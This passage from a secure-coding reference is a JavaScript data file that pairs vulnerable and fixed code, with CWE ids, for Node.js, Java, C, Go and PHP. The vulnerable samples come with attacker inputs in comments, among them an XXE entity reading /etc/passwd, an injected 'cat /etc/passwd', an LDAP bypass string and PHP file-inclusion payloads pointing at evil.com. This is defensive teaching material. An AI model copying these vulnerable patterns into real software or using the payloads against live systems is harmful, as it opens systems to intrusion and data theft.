    res.redirect(302, safeUrl);
  } catch {
    res.status(400).json({ error: 'Invalid URL' });
  }
});`,
        explanation: "CRLF injection in HTTP headers occurs when user input containing \\r\\n (carriage return + line feed) is placed in a response header, allowing the attacker to inject additional headers or split the response. Always validate redirect URLs against an allowlist of domains and strip CRLF characters from any user input placed in headers."
      },
      {
        name: "Mass Assignment / Over-Posting",
        cwe: "CWE-915",
        severity: "high",
        vulnerable_code: `// VULNERABLE: passing entire request body to database
app.put('/api/profile', auth, async (req, res) => {
  await User.findByIdAndUpdate(req.user.id, req.body);
  res.json({ success: true });
});
// Attacker sends: {"name": "Hacker", "role": "admin", "verified": true}
// Overwrites role and verified fields not intended to be user-editable`,
        secure_code: `// SECURE: whitelist allowed fields
app.put('/api/profile', auth, async (req, res) => {
  const ALLOWED = ['name', 'email', 'bio', 'avatar'];
  const updates = {};
  for (const key of ALLOWED) {
    if (req.body[key] !== undefined) {
      updates[key] = req.body[key];
    }
  }
  await User.findByIdAndUpdate(req.user.id, { $set: updates });
  res.json({ success: true });
});

// Or use a validation library like Joi
const Joi = require('joi');
const profileSchema = Joi.object({
  name: Joi.string().max(100),
  email: Joi.string().email(),
  bio: Joi.string().max(500),
  avatar: Joi.string().uri()
}).unknown(false); // Reject unknown keys`,
        explanation: "Mass assignment occurs when an application blindly copies request body fields into a database record, allowing attackers to set fields they shouldn't have access to (role, permissions, balance, verified status). Always use an explicit allowlist of fields that users can modify, or use a validation schema that rejects unknown keys."
      },
      {
        name: "Timing Attack on String Comparison",
        cwe: "CWE-208",
        severity: "medium",
        vulnerable_code: `// VULNERABLE: standard string comparison for secrets
app.post('/api/webhook', (req, res) => {
  const signature = req.headers['x-webhook-signature'];
  const expected = computeHmac(req.body);
  if (signature === expected) {
    processWebhook(req.body);
    res.sendStatus(200);
  } else {
    res.sendStatus(403);
  }
});
// === compares character by character and returns early on mismatch
// An attacker can determine the correct signature one byte at a time
// by measuring response times`,
        secure_code: `// SECURE: constant-time comparison
const crypto = require('crypto');

function timingSafeEqual(a, b) {
  if (typeof a !== 'string' || typeof b !== 'string') return false;
  const bufA = Buffer.from(a);
  const bufB = Buffer.from(b);
  if (bufA.length !== bufB.length) {
    // Compare against itself to maintain constant time
    crypto.timingSafeEqual(bufA, bufA);
    return false;
  }
  return crypto.timingSafeEqual(bufA, bufB);
}

app.post('/api/webhook', (req, res) => {
  const signature = req.headers['x-webhook-signature'];
  const expected = computeHmac(req.body);
  if (timingSafeEqual(signature, expected)) {
    processWebhook(req.body);
    res.sendStatus(200);
  } else {
    res.sendStatus(403);
  }
});`,
        explanation: "Standard string comparison (=== or ==) returns false at the first mismatched character, leaking information about which prefix of the secret is correct. By measuring response times across many requests, an attacker can determine the correct value one byte at a time. Use crypto.timingSafeEqual() which always compares all bytes regardless of where the mismatch occurs."
      }
    ]
  },

  // ============================================================================
  // JAVA
  // ============================================================================
  java: {
    language: "Java",
    categories: [
      {
        name: "SQL Injection",
        cwe: "CWE-89",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: string concatenation in SQL
public User getUser(String username) throws SQLException {
    String query = "SELECT * FROM users WHERE username = '" + username + "'";
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(query);
    if (rs.next()) return mapUser(rs);
    return null;
}`,
        secure_code: `// SECURE: PreparedStatement with parameterized queries
public User getUser(String username) throws SQLException {
    String query = "SELECT * FROM users WHERE username = ?";
    try (PreparedStatement stmt = connection.prepareStatement(query)) {
        stmt.setString(1, username);
        try (ResultSet rs = stmt.executeQuery()) {
            if (rs.next()) return mapUser(rs);
            return null;
        }
    }
}`,
        explanation: "Java's PreparedStatement separates SQL structure from data at the database protocol level — the query plan is compiled before parameters are bound, making SQL injection impossible. Always use PreparedStatement with ? placeholders, never concatenate user input into SQL strings."
      },
      {
        name: "Insecure Deserialization",
        cwe: "CWE-502",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: deserializing untrusted data
import java.io.*;

public Object deserialize(byte[] data) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(
        new ByteArrayInputStream(data)
    );
    return ois.readObject(); // Arbitrary code execution via gadget chains!
}
// Attacker crafts a serialized object using ysoserial
// that executes arbitrary commands during deserialization`,
        secure_code: `// SECURE: use allowlist-based deserialization filter (Java 9+)
import java.io.*;

public Object safeDeserialize(byte[] data) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(
        new ByteArrayInputStream(data)
    ) {
        @Override
        protected Class<?> resolveClass(ObjectStreamClass desc)
                throws IOException, ClassNotFoundException {
            // Allowlist of safe classes
            Set<String> allowed = Set.of(
                "com.myapp.dto.UserDTO",
                "com.myapp.dto.ConfigDTO",
                "java.lang.String",
                "java.util.ArrayList",
                "java.util.HashMap"
            );
            if (!allowed.contains(desc.getName())) {
                throw new InvalidClassException("Unauthorized class", desc.getName());
            }
            return super.resolveClass(desc);
        }
    };
    return ois.readObject();
}

// Better: use JSON instead of Java serialization
// ObjectMapper mapper = new ObjectMapper();
// UserDTO user = mapper.readValue(jsonString, UserDTO.class);`,
        explanation: "Java deserialization can trigger arbitrary code execution through 'gadget chains' — sequences of method calls on common library classes (Apache Commons Collections, Spring, etc.) that are triggered during deserialization. Override resolveClass() with an allowlist of permitted classes, or better yet, use JSON/Protocol Buffers instead of Java serialization."
      },
      {
        name: "XML External Entity (XXE)",
        cwe: "CWE-611",
        severity: "high",
        vulnerable_code: `// VULNERABLE: default XML parser settings
import javax.xml.parsers.*;
import org.w3c.dom.*;

public Document parseXml(String xml) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xml)));
}
// Attacker XML: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`,
        secure_code: `// SECURE: disable external entities and DTDs
import javax.xml.parsers.*;
import org.w3c.dom.*;

public Document parseXml(String xml) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    // Disable XXE
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
    factory.setXIncludeAware(false);
    factory.setExpandEntityReferences(false);
    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xml)));
}`,
        explanation: "Java's default XML parsers process external entity declarations and DTDs, enabling XXE attacks that can read local files, perform SSRF, or cause denial of service (billion laughs attack). Disable DOCTYPE declarations entirely with disallow-doctype-decl, or disable external entities and DTD loading individually."
      },
      {
        name: "Log Injection",
        cwe: "CWE-117",
        severity: "medium",
        vulnerable_code: `// VULNERABLE: user input directly in log messages
import org.slf4j.Logger;

public void login(String username) {
    logger.info("Login attempt for user: " + username);
    // Attacker username: "admin\\nINFO Login successful for user: admin"
    // Injects a fake log entry that looks like a successful admin login
}`,
        secure_code: `// SECURE: sanitize log input and use parameterized logging
import org.slf4j.Logger;

public void login(String username) {
    // Use SLF4J parameterized logging (prevents format string issues)
    String safeUser = username.replaceAll("[\\\\r\\\\n\\\\t]", "_");
    logger.info("Login attempt for user: {}", safeUser);
}

// Or use a structured logging framework (Logback JSON)
// which inherently separates message from data
// MDC.put("username", sanitize(username));
// logger.info("Login attempt");`,
        explanation: "Log injection occurs when user input containing newline characters (\\r, \\n) is written to log files, allowing attackers to forge log entries. This can confuse log analysis, hide attacks, or exploit log viewers (if they interpret HTML/ANSI). Strip control characters from log inputs and use parameterized logging (SLF4J {}) rather than string concatenation."
      },
      {
        name: "LDAP Injection",
        cwe: "CWE-90",
        severity: "high",
        vulnerable_code: `// VULNERABLE: user input in LDAP filter
public boolean authenticate(String username, String password) {
    String filter = "(&(uid=" + username + ")(userPassword=" + password + "))";
    SearchControls sc = new SearchControls();
    NamingEnumeration<?> results = ctx.search("ou=users,dc=company,dc=com",
        filter, sc);
    return results.hasMoreElements();
}
// Attacker username: *)(uid=*))(|(uid=*
// Bypasses authentication by matching all users`,
        secure_code: `// SECURE: escape LDAP special characters
public boolean authenticate(String username, String password) {
    String safeUser = escapeLdap(username);
    String filter = "(&(uid={0})(userPassword={1}))";
    SearchControls sc = new SearchControls();
    NamingEnumeration<?> results = ctx.search(
        "ou=users,dc=company,dc=com",
        filter,
        new Object[]{safeUser, password},
        sc
    );
    return results.hasMoreElements();
}

private String escapeLdap(String input) {
    StringBuilder sb = new StringBuilder();
    for (char c : input.toCharArray()) {
        switch (c) {
            case '\\\\': sb.append("\\\\5c"); break;
            case '*': sb.append("\\\\2a"); break;
            case '(': sb.append("\\\\28"); break;
            case ')': sb.append("\\\\29"); break;
            case '\\0': sb.append("\\\\00"); break;
            default: sb.append(c);
        }
    }
    return sb.toString();
}`,
        explanation: "LDAP injection allows attackers to modify LDAP queries by injecting special characters like *, (, ), and \\. This can bypass authentication or extract directory information. Escape LDAP special characters (RFC 4515) or use parameterized searches where the LDAP API handles escaping."
      },
      {
        name: "Insecure Cryptography",
        cwe: "CWE-327",
        severity: "high",
        vulnerable_code: `// VULNERABLE: weak algorithms and ECB mode
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public byte[] encrypt(byte[] data, byte[] key) throws Exception {
    // DES is broken (56-bit key, brute-forceable)
    Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
    cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "DES"));
    return cipher.doFinal(data);
}
// ECB mode encrypts identical blocks to identical ciphertext
// revealing patterns in the data (the "ECB penguin" problem)`,
        secure_code: `// SECURE: AES-GCM with random IV
import javax.crypto.Cipher;
import javax.crypto.spec.*;
import java.security.SecureRandom;

public byte[] encrypt(byte[] data, byte[] key) throws Exception {
    // AES-256-GCM: authenticated encryption
    byte[] iv = new byte[12]; // 96-bit IV for GCM
    new SecureRandom().nextBytes(iv);
    GCMParameterSpec spec = new GCMParameterSpec(128, iv); // 128-bit auth tag
    Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
    cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"), spec);
    byte[] ciphertext = cipher.doFinal(data);
    // Prepend IV to ciphertext (IV is not secret)
    byte[] result = new byte[iv.length + ciphertext.length];
    System.arraycopy(iv, 0, result, 0, iv.length);
    System.arraycopy(ciphertext, 0, result, iv.length, ciphertext.length);
    return result;
}`,
        explanation: "DES has a 56-bit key (brute-forceable in hours) and ECB mode reveals data patterns because identical plaintext blocks produce identical ciphertext. Use AES-256 with GCM mode which provides both confidentiality and authentication (integrity checking). Always use a random IV/nonce (never reuse with the same key) and prepend it to the ciphertext for decryption."
      },
      {
        name: "Open Redirect",
        cwe: "CWE-601",
        severity: "medium",
        vulnerable_code: `// VULNERABLE: unvalidated redirect URL
@GetMapping("/redirect")
public String redirect(@RequestParam String url) {
    return "redirect:" + url;
}
// Attacker: /redirect?url=https://evil-phishing-site.com/login
// User sees your domain in the original URL and trusts the redirect`,
        secure_code: `// SECURE: validate redirect against allowlist
@GetMapping("/redirect")
public String redirect(@RequestParam String url) {
    try {
        URI uri = new URI(url);
        Set<String> allowed = Set.of("darknode.ai", "www.darknode.ai");
        if (uri.getHost() != null && !allowed.contains(uri.getHost())) {
            return "redirect:/";
        }
        // Also block javascript: and data: URIs
        String scheme = uri.getScheme();
        if (scheme != null && !scheme.equals("https") && !scheme.equals("http")) {
            return "redirect:/";
        }
        return "redirect:" + url;
    } catch (URISyntaxException e) {
        return "redirect:/";
    }
}`,
        explanation: "Open redirects allow attackers to craft URLs on your domain that redirect to phishing sites. Since the initial URL shows your trusted domain, users are more likely to trust the destination. Validate redirect targets against an allowlist of permitted domains and reject non-HTTP(S) schemes."
      }
    ]
  },

  // ============================================================================
  // C
  // ============================================================================
  c: {
    language: "C",
    categories: [
      {
        name: "Stack Buffer Overflow",
        cwe: "CWE-121",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: unbounded string copy
#include <string.h>
void greet(const char *name) {
    char buffer[64];
    strcpy(buffer, name);  // No bounds checking!
    printf("Hello, %s!\\n", buffer);
}
// If name > 63 chars, overwrites return address on the stack
// Attacker can redirect execution to shellcode`,
        secure_code: `// SECURE: bounded copy with explicit size
#include <string.h>
#include <stdio.h>
void greet(const char *name) {
    char buffer[64];
    strncpy(buffer, name, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\\0';  // Ensure null termination
    printf("Hello, %s!\\n", buffer);
}
// Even better: use snprintf
void greet_v2(const char *name) {
    char buffer[64];
    snprintf(buffer, sizeof(buffer), "Hello, %s!", name);
    puts(buffer);
}`,
        explanation: "strcpy copies until it hits a null terminator with no size limit, allowing buffer overflows that overwrite adjacent stack memory including the return address. Use strncpy with explicit size limits (and ensure null termination), or snprintf which automatically limits output. Enable compiler protections: -fstack-protector-strong, -D_FORTIFY_SOURCE=2."
      },
      {
        name: "Heap Buffer Overflow",
        cwe: "CWE-122",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: heap overflow via integer overflow in size calculation
#include <stdlib.h>
#include <string.h>
void process_items(int count, const char *data) {
    // Integer overflow: if count = 0x40000001, size = 4 (wraps around)
    size_t size = count * sizeof(int);
    int *items = malloc(size);
    memcpy(items, data, count * sizeof(int));  // Copies way more than allocated
    // ... process items
    free(items);
}`,
        secure_code: `// SECURE: check for integer overflow before allocation
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
int process_items(size_t count, const char *data) {
    // Check for multiplication overflow
    if (count > SIZE_MAX / sizeof(int)) {
        return -1;  // Overflow would occur
    }
    size_t size = count * sizeof(int);
    if (size == 0) return 0;
    int *items = malloc(size);
    if (!items) return -1;  // Allocation failed
    memcpy(items, data, size);
    // ... process items
    free(items);
    return 0;
}`,
        explanation: "Integer overflows in size calculations cause small allocations to be made for large data copies, resulting in heap buffer overflows. Always check that multiplication won't overflow before using the result for allocation (compare against SIZE_MAX / element_size). Also check malloc's return value — it returns NULL on failure."
      },
      {
        name: "Format String Vulnerability",
        cwe: "CWE-134",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: user input as format string
#include <stdio.h>
void log_message(const char *user_msg) {
    printf(user_msg);  // User controls the format string!
}
// Attacker input: "%x %x %x %x" — reads stack memory
// Attacker input: "%n" — writes to arbitrary memory addresses
// Can achieve arbitrary code execution via %n`,
        secure_code: `// SECURE: always use a format specifier
#include <stdio.h>
void log_message(const char *user_msg) {
    printf("%s", user_msg);  // %s treats input as data, not format
}
// Or use puts() for simple string output:
void log_message_v2(const char *user_msg) {
    fputs(user_msg, stdout);
    fputc('\\n', stdout);
}`,
        explanation: "When user input is passed directly as the format string to printf/sprintf/fprintf, attackers can use %x to read stack memory, %s to read from arbitrary addresses, and %n to write to arbitrary memory locations (achieving code execution). Always pass user input as an argument to a fixed format string: printf(\"%s\", user_input)."
      },
      {
        name: "Use-After-Free",
        cwe: "CWE-416",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: using freed memory
#include <stdlib.h>
typedef struct { char *name; int age; } User;

User *user = malloc(sizeof(User));
user->name = strdup("Alice");
user->age = 30;
free(user);
// ... other code may reuse this memory ...
printf("Name: %s\\n", user->name);  // Use-after-free!
// If the memory was reallocated, attacker controls the data`,
        secure_code: `// SECURE: null pointers after free
#include <stdlib.h>
typedef struct { char *name; int age; } User;

void free_user(User **userp) {
    if (userp && *userp) {
        free((*userp)->name);
        (*userp)->name = NULL;
        free(*userp);
        *userp = NULL;  // Prevent use-after-free
    }
}

User *user = malloc(sizeof(User));
if (!user) return;
user->name = strdup("Alice");
user->age = 30;
// When done:
free_user(&user);
// user is now NULL — any access will crash immediately (not silently corrupt)`,
        explanation: "Use-after-free occurs when memory is accessed after being freed. The freed memory may be reallocated to another object, allowing attackers to control the data at that address. Set pointers to NULL immediately after freeing, use wrapper functions that take a pointer-to-pointer (so the caller's pointer is nulled), and consider static analysis tools (Valgrind, AddressSanitizer)."
      },
      {
        name: "Double Free",
        cwe: "CWE-415",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: freeing the same memory twice
void process(char *data) {
    char *copy = strdup(data);
    if (some_condition) {
        free(copy);
        // ... error handling ...
    }
    // Later, unconditionally free again
    free(copy);  // Double free! Corrupts heap metadata
}`,
        secure_code: `// SECURE: set to NULL after free, check before free
void process(char *data) {
    char *copy = strdup(data);
    if (!copy) return;
    if (some_condition) {
        free(copy);
        copy = NULL;
        // ... error handling ...
        return;  // Don't continue if we freed and handled the error
    }
    // Only free if not already freed
    free(copy);
    copy = NULL;
}

// Better pattern: single cleanup point
void process_v2(char *data) {
    char *copy = strdup(data);
    if (!copy) return;
    int result = 0;
    if (some_condition) {
        result = -1;
        goto cleanup;
    }
    // ... normal processing ...
cleanup:
    free(copy);
}`,
        explanation: "Double-free corrupts the heap allocator's metadata, which can be exploited for arbitrary code execution. The attacker can manipulate the free list to make a future malloc return a pointer to attacker-controlled memory. Always set pointers to NULL after freeing (free(NULL) is a no-op), use a single cleanup label with goto, or use RAII patterns with cleanup attributes."
      },
      {
        name: "Integer Overflow",
        cwe: "CWE-190",
        severity: "high",
        vulnerable_code: `// VULNERABLE: integer overflow in length check
#include <string.h>
int copy_data(char *dest, size_t dest_size, const char *src, int src_len) {
    // If src_len is negative (attacker-controlled), this check passes
    if (src_len > dest_size) return -1;
    // But memcpy interprets src_len as unsigned (huge number)
    memcpy(dest, src, src_len);
    return 0;
}
// Also: signed/unsigned comparison
int len = -1;
if (len < sizeof(buffer)) {  // True! -1 < sizeof => unsigned comparison
    memcpy(buffer, data, len);  // len becomes huge unsigned value
}`,
        secure_code: `// SECURE: use size_t for sizes, check overflow explicitly
#include <string.h>
#include <stdint.h>
int copy_data(char *dest, size_t dest_size, const char *src, size_t src_len) {
    // Both are unsigned — no sign confusion
    if (src_len == 0) return 0;
    if (src_len > dest_size) return -1;
    memcpy(dest, src, src_len);
    return 0;
}

// Safe addition with overflow check
int safe_add(size_t a, size_t b, size_t *result) {
    if (a > SIZE_MAX - b) return -1;  // Would overflow
    *result = a + b;
    return 0;
}`,
        explanation: "Integer overflows occur when arithmetic operations exceed the type's range, wrapping around. Signed overflow is undefined behavior in C. Signed/unsigned comparison is particularly dangerous: a negative int compared to an unsigned size_t undergoes implicit conversion, making -1 appear as a huge positive number. Use size_t for all sizes/lengths and check arithmetic operations for overflow before performing them."
      },
      {
        name: "Null Pointer Dereference",
        cwe: "CWE-476",
        severity: "medium",
        vulnerable_code: `// VULNERABLE: unchecked return values
#include <stdlib.h>
void process() {
    char *buf = malloc(1024);
    // malloc can return NULL if out of memory
    strcpy(buf, "hello");  // Crash if buf is NULL

    FILE *f = fopen("/tmp/data.txt", "r");
    // fopen returns NULL if file doesn't exist
    fgets(buf, 1024, f);  // Crash if f is NULL
}`,
        secure_code: `// SECURE: check every allocation and return value
#include <stdlib.h>
#include <stdio.h>
int process() {
    char *buf = malloc(1024);
    if (!buf) {
        perror("malloc");
        return -1;
    }
    strcpy(buf, "hello");

    FILE *f = fopen("/tmp/data.txt", "r");
    if (!f) {
        perror("fopen");
        free(buf);
        return -1;
    }
    if (!fgets(buf, 1024, f)) {
        // fgets returns NULL on error or EOF
        buf[0] = '\\0';
    }
    fclose(f);
    free(buf);
    return 0;
}`,
        explanation: "Dereferencing a NULL pointer is undefined behavior in C — it usually causes a segfault but can be exploited on systems where address 0 is mappable (older Linux kernels, embedded systems). Always check the return values of malloc, calloc, realloc, fopen, and any function that can return NULL. A NULL dereference in a kernel context can lead to privilege escalation."
      }
    ]
  },

  // ============================================================================
  // GO
  // ============================================================================
  go: {
    language: "Go",
    categories: [
      {
        name: "SQL Injection",
        cwe: "CWE-89",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: string formatting in SQL
func getUser(db *sql.DB, username string) (*User, error) {
    query := fmt.Sprintf("SELECT * FROM users WHERE username = '%s'", username)
    row := db.QueryRow(query)
    var u User
    err := row.Scan(&u.ID, &u.Name, &u.Email)
    return &u, err
}`,
        secure_code: `// SECURE: parameterized queries
func getUser(db *sql.DB, username string) (*User, error) {
    query := "SELECT id, name, email FROM users WHERE username = $1"
    row := db.QueryRow(query, username)
    var u User
    err := row.Scan(&u.ID, &u.Name, &u.Email)
    if err == sql.ErrNoRows {
        return nil, nil
    }
    return &u, err
}`,
        explanation: "Go's database/sql package supports parameterized queries with $1, $2 (PostgreSQL) or ? (MySQL/SQLite) placeholders. The driver handles escaping at the protocol level, making SQL injection impossible. Never use fmt.Sprintf or string concatenation for SQL queries."
      },
      {
        name: "Path Traversal",
        cwe: "CWE-22",
        severity: "high",
        vulnerable_code: `// VULNERABLE: serving files from user input
func serveFile(w http.ResponseWriter, r *http.Request) {
    name := r.URL.Query().Get("file")
    path := filepath.Join("./uploads", name)
    http.ServeFile(w, r, path)
}
// Attacker: ?file=../../../etc/passwd`,
        secure_code: `// SECURE: validate resolved path stays in allowed directory
func serveFile(w http.ResponseWriter, r *http.Request) {
    name := filepath.Base(r.URL.Query().Get("file")) // Strip directory components
    if name == "." || name == ".." {
        http.Error(w, "Invalid filename", http.StatusBadRequest)
        return
    }
    absUpload, _ := filepath.Abs("./uploads")
    absPath, _ := filepath.Abs(filepath.Join("./uploads", name))
    if !strings.HasPrefix(absPath, absUpload+string(os.PathSeparator)) {
        http.Error(w, "Access denied", http.StatusForbidden)
        return
    }
    http.ServeFile(w, r, absPath)
}`,
        explanation: "filepath.Join normalizes paths but doesn't prevent traversal — Join(\"./uploads\", \"../../../etc/passwd\") returns a valid path outside uploads. Use filepath.Base() to strip directory components and filepath.Abs() to resolve the full path, then verify it starts with the allowed directory prefix."
      },
      {
        name: "Race Condition in Goroutines",
        cwe: "CWE-362",
        severity: "high",
        vulnerable_code: `// VULNERABLE: unsynchronized shared state
var balance int64 = 1000

func withdraw(amount int64) bool {
    if balance >= amount {
        // Race window: another goroutine can withdraw here
        time.Sleep(time.Millisecond) // Simulates processing
        balance -= amount
        return true
    }
    return false
}

// Two goroutines can both see balance=1000 and both withdraw 800
// Result: balance = -600`,
        secure_code: `// SECURE: use mutex or atomic operations
import "sync"

var (
    balance int64 = 1000
    mu      sync.Mutex
)

func withdraw(amount int64) bool {
    mu.Lock()
    defer mu.Unlock()
    if balance >= amount {
        balance -= amount
        return true
    }
    return false
}

// Or use channels for state management
type Bank struct {
    ops chan func()
    bal int64
}

func NewBank(initial int64) *Bank {
    b := &Bank{ops: make(chan func()), bal: initial}
    go func() { for op := range b.ops { op() } }()
    return b
}`,
        explanation: "Go's goroutines make concurrent programming easy but also make race conditions easy to introduce. Without synchronization, multiple goroutines reading and writing shared variables can see inconsistent state. Use sync.Mutex for critical sections, sync/atomic for simple counters, or channels to serialize access to shared state. Run tests with -race to detect data races."
      },
      {
        name: "Unvalidated Redirect",
        cwe: "CWE-601",
        severity: "medium",
        vulnerable_code: `// VULNERABLE: open redirect
func loginHandler(w http.ResponseWriter, r *http.Request) {
    next := r.URL.Query().Get("next")
    // ... authenticate user ...
    http.Redirect(w, r, next, http.StatusFound)
}
// Attacker: /login?next=https://evil.com/steal-session`,
        secure_code: `// SECURE: validate redirect target
func loginHandler(w http.ResponseWriter, r *http.Request) {
    next := r.URL.Query().Get("next")
    // ... authenticate user ...
    safe := sanitizeRedirect(next)
    http.Redirect(w, r, safe, http.StatusFound)
}

func sanitizeRedirect(target string) string {
    u, err := url.Parse(target)
    if err != nil || u.Host != "" {
        return "/" // Default to home for absolute URLs
    }
    // Only allow relative paths
    if !strings.HasPrefix(u.Path, "/") {
        return "/"
    }
    return u.Path
}`,
        explanation: "Open redirects let attackers craft URLs on your domain that redirect to phishing sites. Only allow relative paths (no scheme or host) in redirect parameters, or validate against an allowlist of trusted domains."
      },
      {
        name: "Insecure TLS Configuration",
        cwe: "CWE-295",
        severity: "high",
        vulnerable_code: `// VULNERABLE: disabling TLS verification
client := &http.Client{
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: true, // Accepts ANY certificate!
        },
    },
}
resp, err := client.Get("https://api.example.com/data")`,
        secure_code: `// SECURE: proper TLS with certificate pinning
client := &http.Client{
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{
            MinVersion: tls.VersionTLS12,
            // Default verifies the certificate chain — don't override
        },
    },
    Timeout: 30 * time.Second,
}
resp, err := client.Get("https://api.example.com/data")
if err != nil {
    log.Printf("TLS error (expected): %v", err)
    return
}`,
        explanation: "InsecureSkipVerify: true disables all TLS certificate verification, making the connection vulnerable to man-in-the-middle attacks. Go's default TLS configuration verifies certificates against the system trust store — leave it alone. If you need custom CAs (internal services), add them to the RootCAs pool rather than disabling verification."
      },
      {
        name: "Command Injection",
        cwe: "CWE-78",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: shell execution with user input
func runDNS(domain string) (string, error) {
    cmd := exec.Command("sh", "-c", "dig "+domain)
    out, err := cmd.Output()
    return string(out), err
}
// Attacker: "example.com; cat /etc/passwd"`,
        secure_code: `// SECURE: pass arguments directly (no shell)
func runDNS(domain string) (string, error) {
    // Validate input
    if !regexp.MustCompile("^[a-zA-Z0-9][a-zA-Z0-9.-]+$").MatchString(domain) {
        return "", fmt.Errorf("invalid domain: %s", domain)
    }
    // exec.Command without "sh -c" passes args directly to the binary
    cmd := exec.Command("dig", "+short", domain)
    out, err := cmd.Output()
    return string(out), err
}`,
        explanation: "Using exec.Command(\"sh\", \"-c\", userInput) passes the entire string through a shell, enabling command injection with ;, |, &&, etc. Use exec.Command(binary, arg1, arg2, ...) which passes arguments directly to the binary without shell interpretation. Always validate input format before using it in commands."
      }
    ]
  },

  // ============================================================================
  // PHP
  // ============================================================================
  php: {
    language: "PHP",
    categories: [
      {
        name: "SQL Injection",
        cwe: "CWE-89",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: string interpolation in SQL
$username = $_GET['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query);`,
        secure_code: `// SECURE: prepared statements with PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $_GET['username']]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

// Or with MySQLi
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $_GET['username']);
$stmt->execute();
$result = $stmt->get_result();`,
        explanation: "PHP's PDO and MySQLi both support prepared statements that separate SQL from data. PDO is preferred as it works with multiple databases and has a cleaner API. Never use mysql_query (deprecated) or string concatenation/interpolation in SQL."
      },
      {
        name: "File Inclusion (LFI/RFI)",
        cwe: "CWE-98",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: user input in include/require
$page = $_GET['page'];
include("pages/" . $page . ".php");
// Attacker: ?page=../../../etc/passwd%00  (null byte injection in older PHP)
// Attacker: ?page=http://evil.com/shell    (Remote File Inclusion)
// Attacker: ?page=php://filter/convert.base64-encode/resource=config`,
        secure_code: `// SECURE: allowlist of valid pages
$allowed = ['home', 'about', 'contact', 'dashboard'];
$page = $_GET['page'] ?? 'home';
if (!in_array($page, $allowed, true)) {
    $page = 'home';
}
include("pages/{$page}.php");

// Also disable remote file inclusion in php.ini:
// allow_url_include = Off
// allow_url_fopen = Off (if not needed)`,
        explanation: "PHP's include/require execute any PHP file, and with allow_url_include=On, even remote URLs. Local file inclusion can read any file on disk using php:// wrappers. Always use an allowlist of valid page names rather than user input in file paths. Disable allow_url_include in php.ini."
      },
      {
        name: "Cross-Site Scripting (XSS)",
        cwe: "CWE-79",
        severity: "high",
        vulnerable_code: `// VULNERABLE: echoing user input without escaping
<h1>Welcome, <?php echo $_GET['name']; ?></h1>
<input value="<?= $user_input ?>">

// Also vulnerable in JSON context:
<script>var data = <?php echo json_encode($user_input); ?>;</script>
// json_encode without JSON_HEX_TAG allows </script> injection`,
        secure_code: `// SECURE: htmlspecialchars with ENT_QUOTES
<h1>Welcome, <?= htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') ?></h1>
<input value="<?= htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8') ?>">

// For JSON in script contexts:
<script>
var data = <?= json_encode($user_input, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP) ?>;
</script>

// Helper function to avoid repeating flags:
function e($s) { return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }`,
        explanation: "PHP does not auto-escape output. Every variable rendered into HTML must be passed through htmlspecialchars() with ENT_QUOTES and UTF-8 encoding to prevent XSS. For JSON in script blocks, use json_encode with JSON_HEX_TAG to prevent </script> injection. Consider using a templating engine like Blade or Twig that auto-escapes by default."
      },
      {
        name: "Insecure File Upload",
        cwe: "CWE-434",
        severity: "critical",
        vulnerable_code: `// VULNERABLE: trusting user-supplied filename and type
$target = "uploads/" . $_FILES['file']['name'];
if ($_FILES['file']['type'] === 'image/jpeg') {
    move_uploaded_file($_FILES['file']['tmp_name'], $target);
    echo "Uploaded: $target";
}
// Attacker: uploads shell.php.jpg with Content-Type: image/jpeg
// Or: uploads .htaccess to enable PHP execution in uploads/`,
        secure_code: `// SECURE: validate content, generate safe filename
function handleUpload($file) {
    $maxSize = 5 * 1024 * 1024; // 5MB
    if ($file['error'] !== UPLOAD_ERR_OK || $file['size'] > $maxSize) {
        return false;
    }
    // Verify actual file type (not user-supplied MIME)
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);
    $allowed = ['image/jpeg' => 'jpg', 'image/png' => 'png', 'image/gif' => 'gif'];
    if (!isset($allowed[$mime])) return false;
    // Generate random filename (never use user's filename)
